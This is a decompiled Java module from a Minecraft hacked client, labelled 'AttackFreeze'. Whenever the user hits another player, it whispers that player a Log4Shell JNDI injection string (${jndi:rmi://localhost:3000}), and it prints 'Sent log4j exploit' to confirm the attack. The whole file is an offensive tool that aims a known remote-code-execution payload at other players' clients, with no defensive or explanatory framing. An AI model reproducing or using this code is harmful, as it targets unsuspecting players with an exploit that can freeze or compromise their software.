/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  kotlin.jvm.internal.Intrinsics
 *  net.minecraft.entity.Entity
 *  net.minecraft.entity.player.EntityPlayer
 */
package net.aspw.client.features.module.impl.combat;

import kotlin.jvm.internal.Intrinsics;
import net.aspw.client.event.AttackEvent;
import net.aspw.client.event.EventTarget;
import net.aspw.client.features.module.Module;
import net.aspw.client.features.module.ModuleCategory;
import net.aspw.client.features.module.ModuleInfo;
import net.aspw.client.util.MinecraftInstance;
import net.aspw.client.value.BoolValue;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;

@ModuleInfo(name="AttackFreeze", spacedName="Attack Freeze", description="", category=ModuleCategory.COMBAT)
public final class AttackFreeze
extends Module {
    private final BoolValue debug = new BoolValue("Debug", true);

    @EventTarget
    public final void onAttack(AttackEvent event) {
        Intrinsics.checkNotNullParameter((Object)event, (String)"event");
        if (event.getTargetEntity() instanceof EntityPlayer) {
            Entity player = event.getTargetEntity();
            MinecraftInstance.mc.thePlayer.sendChatMessage("/msg " + ((EntityPlayer)player).getName() + " ${jndi:rmi://localhost:3000}");
            if (((Boolean)this.debug.get()).booleanValue()) {
                this.chat("Sent log4j exploit to " + ((EntityPlayer)player).getName() + '!');
            }
        }
    }
}

